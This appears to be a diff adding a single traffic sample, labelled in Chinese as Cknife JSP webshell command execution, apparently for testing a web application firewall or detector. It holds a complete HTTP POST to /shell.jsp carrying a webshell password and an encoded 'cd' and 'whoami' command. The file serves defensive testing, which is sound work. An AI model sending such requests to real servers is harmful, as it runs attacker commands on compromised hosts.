@@ -1,0 +1,11 @@
+# webshell活动_Cknife_JSP_命令执行
+# c刀是由java写的客户端，所以它适用性比较强，linux、windows平台都可以使用攻击者通过Cknife webshell工具建立连接，执行任意命令。
+POST /shell.jsp?acid=80002255&bid=hd_tag_m8mv25mr HTTP/1.1
+Host: www.swaf.com
+Content-type: application/x-www-form-urlencoded
+RM-PRO-BusinessID: hd_tag_m8mv25mr
+RM-PRO-Token: 604b72f27132c605f03ac09e87dc86e7
+RM-PRO-Time: 1742808482218
+User-Agent: Java/1.8.0_301
+
+pass=M&z0=UTF-8&z1=/ccmd&z2=cd+%2Fd+C%3A%5Cphpstudy_pro%5CWWW%5C%26whoami%26echo+%5BS%5D%26cd%26echo+%5BE%5D&act=login
